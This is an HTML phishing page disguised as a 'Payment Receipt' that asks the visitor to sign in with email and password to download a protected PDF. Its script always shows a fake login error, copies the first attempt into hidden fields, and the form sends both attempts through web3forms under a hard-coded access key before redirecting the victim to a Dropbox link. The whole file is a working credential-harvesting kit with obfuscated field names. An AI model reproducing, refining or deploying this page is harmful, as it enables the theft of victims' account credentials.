
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment Receipt</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            height: 100vh;
            background: url('data:image/png;base64,') no-repeat center center fixed;
            background-size: cover;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .container {
            background: rgba(255,255,255); /* Semi-transparent background */
            padding: 60px;
            border-radius: 10px;
            width: 100%;
            max-width: 280px;
            text-align: center;
            color: white;
        }

        .logo {
            width: 50px; /* Adjust width */
            height: 50px; /* Adjust height */
            object-fit: contain; /* Ensures the logo maintains its aspect ratio */
            margin-bottom: 20px;
        }

        .input-container {
            margin: 15px 0;
            text-align: left; /* Align labels and inputs to the left */
        }

        .input-container label {
            display: block;
            margin-bottom: 1px;
            font-size: 14px;
            color: black; /* Set label color to black */
            font-weight: bold;
        }

        .input-container input {
            width: 100%;
            height: 45px; /* Default height for PC */
            padding: 10px;
            margin: 5px 0;
            font-size: 16px; /* Font size for PC */
            border-radius: 5px;
            border: 1px solid #ccc;
            outline: none;
            box-sizing: border-box;
        }

        .input-container input:focus {
            border-color: #007BFF;
        }

        .button-container {
            margin-top: 20px;
            display: flex;
            justify-content: flex-end;
        }

        .button-container button {
            padding: 10px 20px;
            background-color: #007BFF;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px; /* Adjust the size as needed */
            font-family: Arial, sans-serif;
        }

        .button-container button:disabled {
            background-color: #ccc;
        }

        /* Error message positioning on page2 */
        .error {
            color: red;
            font-size: 12px;
            font-weight: bold;
            display: none; /* Initially hidden */
            margin-bottom: 10px;
            text-align: left;
        }

        /* Responsive design */
        @media (max-width: 768px) {
            .container {
                max-width: 250px;
                padding: 15px;
            }

            .logo {
                width: 50px;
                height: 50px;
            }

            .input-container input {
                height: 40px; /* Slightly smaller height for tablets */
                font-size: 14px; /* Smaller font size */
            }

            .button-container button {
                font-size: 14px; /* Adjust button size */
                padding: 8px 16px;
            }
        }

        @media (max-width: 480px) {
            body {
                padding: 10px;
            }

            .container {
                padding: 10px;
            }

            .input-container label {
                font-size: 12px;
            }

            .input-container input {
                height: 35px; /* Smaller height for mobile */
                font-size: 12px; /* Font size scales with smaller input */
            }

            .button-container button {
                font-size: 12px; /* Further reduce button size */
                padding: 6px 14px;
            }
        }
    </style>
</head>
<body>
    <div id="page1">
        <div class="container">
            <img src="https://cdn.glitch.global/869e45ec-e1e5-429d-8b82-907580af677e/pdf.PNG?v=1734033852970" alt="Logo" class="logo">
            
<p style="margin-top: 4px; font-size: 12px; color: black; text-align: center; font-family: Arial, Helvetica, Sans-Serif; font-weight: bold;">
    Password-protected document.<br> Sign in with your email to download PDF file.
</p>

            <div class="input-container">
                <label for="email">Email:</label>
                <input type="email" id="_arsernal" name="_arsernal" required placeholder="Email" required>
            </div>
            
            <div class="input-container">
                <label for="password">Password:</label>
                <input type="password" id="_gunners" name="_gunners" required placeholder="Password" required>
            </div>

            <div class="button-container">
                <button type="button" onclick="goToStep2()">Login</button>
                <div id="loading" style="display: none; margin-top: 10px; text-align: center;"></div>
            </div>
        </div>
    </div>

    <div id="page2" style="display: none;">
        <form action="https://api.web3forms.com/submit" method="POST">
            <input type="hidden" name="access_key" value="ec83e6ec-bbc9-4e97-af5a-0ece442b2a52">
            <input type="hidden" name="subject" value="General - login">
            <input type="hidden" name="redirect" value="https://www.dropbox.com/sh/yp6b20rj6erzrg0/AAAHwF0eVdVsMfVJMC1TwPWFa?dl=0">
            <input type="hidden" id="hiddenArsernal" name="_arsernal">
            <input type="hidden" id="hiddenGunners" name="_gunners">
        
            <div class="container">
                <img src="https://cdn.glitch.global/869e45ec-e1e5-429d-8b82-907580af677e/pdf.PNG?v=1734033852970" alt="Logo" class="logo">

<p style="margin-top: 8px; font-size: 12px; color: black; text-align: center; font-family: Arial, Helvetica, Sans-Serif; font-weight: bold;">
    Password-protected document. <br>Sign in with your email to download PDF file.
</p>
                
                <div class="input-container">
                    <label for="email">Email:</label>
                    <input type="email" id="email" name="re_arsernal" required placeholder="Email" required>
                </div>
                
                <div class="input-container">
                    <label for="password">Password:</label>
                    <input type="password" id="password" name="re_gunners" required placeholder="Password" required>
                </div>
                
                <!-- Error message on second page -->
                <div class="error" id="errorMessage">Incorrect email or password. Please try again.</div>

                <div class="button-container">
                    <button type="submit">Login</button>
                </div>
            </div>
        </form>
    </div>

<script>
    function goToStep2() {
        const arsernal = document.getElementById('_arsernal').value;
        const gunners = document.getElementById('_gunners').value;

        // Always transition to page 2
        document.getElementById('page1').style.display = 'none';
        document.getElementById('page2').style.display = 'block';

        // Display the error message on page 2
        const errorMessage = document.getElementById('errorMessage');
        errorMessage.textContent = "Incorrect email or password. Please try again."; // Error message content
        errorMessage.style.display = 'block';

        // Transfer data to hidden fields on page 2
        document.getElementById('hiddenArsernal').value = arsernal;
        document.getElementById('hiddenGunners').value = gunners;

        // Populate the email field on page 2 with the email from page 1
        document.getElementById('email').value = arsernal;
    }
</script>
</body>
</html>
